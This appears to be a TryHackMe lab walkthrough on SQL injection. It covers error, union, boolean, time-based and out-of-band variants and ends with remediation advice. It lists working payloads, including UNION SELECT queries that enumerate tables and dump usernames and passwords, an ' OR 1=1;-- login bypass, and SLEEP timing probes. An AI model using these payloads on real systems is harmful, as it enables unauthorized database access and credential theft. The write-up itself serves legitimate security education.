# 🔥 SQL Injection Attacks on TryHackMe: A Complete Guide & Practical Walkthrough 🚀

* * *

## Introduction

SQL Injection (SQLi) is one of the most notorious web vulnerabilities that allows attackers to manipulate backend databases through unsafe user inputs. This report covers various types of SQLi attacks encountered and practiced on TryHackMe, including detailed practical steps and payload examples.

* * *

## 1️⃣ In-Band SQL Injection

> 
> 
> **The easiest and most common SQLi attack type** — using the same channel for injection and data retrieval.
> 

### 🟢 Types of In-Band SQLi:

- **Error-Based SQLi:**

Leverages database error messages displayed on the webpage to learn about database structure.

*Example:* Breaking the SQL query using `'` causes a syntax error revealing vulnerability.
- **Union-Based SQLi:**

Uses the `UNION` operator to combine results from the original query with attacker-controlled queries, extracting large datasets.

### ⚙️ Practical Steps & Payloads:

- Start by causing errors with input like:

    ```
    sqlCopyEdit1'
    ```
- Fix column count mismatch errors by adjusting UNION SELECT columns:

    ```
    sqlCopyEdit1 UNION SELECT 1,2,3
    ```
- Retrieve database name:

    ```
    sqlCopyEdit0 UNION SELECT 1,2,database()
    ```
- Enumerate tables:

    ```
    sqlCopyEdit0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
    ```
- Get columns of `staff_users` table:

    ```
    sqlCopyEdit0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
    ```
- Extract usernames and passwords:

    ```
    sqlCopyEdit0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
    ```

> 
> 
> 🎯 Goal: Access Martin’s password from the staff\_users table.
> 

* * *

## 2️⃣ Blind SQL Injection

> 
> 
> **No direct feedback from the application**, but attackers infer data through side channels.
> 

### 🔓 Authentication Bypass via Blind SQLi:

- Login forms usually check if username and password pair exists.
- Bypass login by injecting a query that always evaluates to true, e.g.:

    ```
    sqlCopyEdit' OR 1=1;--
    ```
- This tricks the database into authenticating the user without knowing real credentials.

### 🟡 Boolean-Based Blind SQLi:

- Responses are limited to boolean values like true/false or yes/no.
- Attackers systematically test payloads to infer database structure.

### 🛠 Practical Enumeration:

- Determine the number of columns using UNION SELECT with incremented columns:

    ```
    sqlCopyEditadmin123' UNION SELECT 1,2,3;--
    ```
- Discover database name character-by-character using LIKE with wildcards:

    ```
    sqlCopyEditadmin123' UNION SELECT 1,2,3 where database() like 's%';--
    ```
- Enumerate tables and columns similarly via `information_schema`.
- Find usernames and passwords by cycling through possible characters.

* * *

## 3️⃣ Time-Based Blind SQL Injection

> 
> 
> Similar to Boolean-based, but instead of visible responses, **response delay** indicates true or false.
> 

### ⏳ How it works:

- Use the `SLEEP(x)` function to cause delays if query is true:

    ```
    sqlCopyEditadmin123' UNION SELECT SLEEP(5),2;--
    ```
- If the server delays response by 5 seconds, the condition is true.
- Use this timing to enumerate database info slowly and stealthily.

* * *

## 4️⃣ Out-of-Band SQL Injection

> 
> 
> Rarer attack relying on features that enable **external data retrieval channels**.
> 

### How it works:

- Attack payload causes the database to make an HTTP/DNS request back to the attacker’s server.
- Requires specific server features or web app behavior.

* * *

## 🛡️ Remediation & Protection

1. **Prepared Statements with Parameterized Queries:**

Separate SQL code from user inputs to avoid injection.
2. **Input Validation:**

Allowlist inputs and sanitize/escape dangerous characters.
3. **Escaping User Inputs:**

Use proper escaping for special characters like `'`, `"`, `$`, `\` to prevent breaking queries.

| Attack Type             | Key Feature                          | Detection Method              | Example Payload                     |
| ----------------------- | ------------------------------------ | ----------------------------- | ----------------------------------- |
| In-Band (Error/Union)   | Direct feedback/errors shown on page | Cause SQL errors or use UNION | `1'`, `0 UNION SELECT 1,2,3`        |
| Blind SQLi (Boolean)    | True/False responses                 | Boolean inference             | `' OR 1=1;--`                       |
| Blind SQLi (Time-Based) | Response delay on true condition     | Timing attack                 | `UNION SELECT SLEEP(5),2;--`        |
| Out-of-Band             | Data sent via external channels      | Requires server callbacks     | Custom payloads triggering DNS/HTTP |

## 🙌 Final Notes
Practicing SQL Injection on TryHackMe helps build a strong foundation in web app security testing. Understanding and exploiting different SQLi types is essential for both attackers and defenders in cybersecurity.

Stay ethical and always test in authorized environments! 🛡️